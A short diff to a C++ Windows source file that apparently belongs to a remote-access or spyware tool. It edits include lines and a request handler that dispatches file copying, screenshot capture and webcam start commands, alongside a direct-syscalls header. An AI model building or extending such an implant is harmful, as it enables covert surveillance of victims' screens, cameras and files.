@@ -10,14 +10,18 @@
 
 #include <iostream>
 #include <string>
-#include <thread>
 #include <winsock2.h>
 #include <ws2tcpip.h>
  //#include <nlohmann/json.hpp>
  //#include <cpr/cpr.h>
-#include <vector>
-#include <memory>
 #include "syscalls.h"
+#include <minwindef.h>
+#include <ws2def.h>
+#include <ws2ipdef.h>
+#include <minwinbase.h>
+#include <exception>
+#include <iosfwd>
+#include "const.h"
 
 #pragma comment(lib, "Ws2_32.lib")
 
@@ -52,7 +56,7 @@ static void handleRequest(std::string& request, std::string& response, std::stri
 			copyFile(params, response);
 			break;
 		case CAPTURE_SCREENSHOT:
-			captureScreenshot(params, response, file);
+			captureScreenshot("screenshot.png", response, file);
 			break;
 		case START_WEBCAM:
 			startWebcam(response);
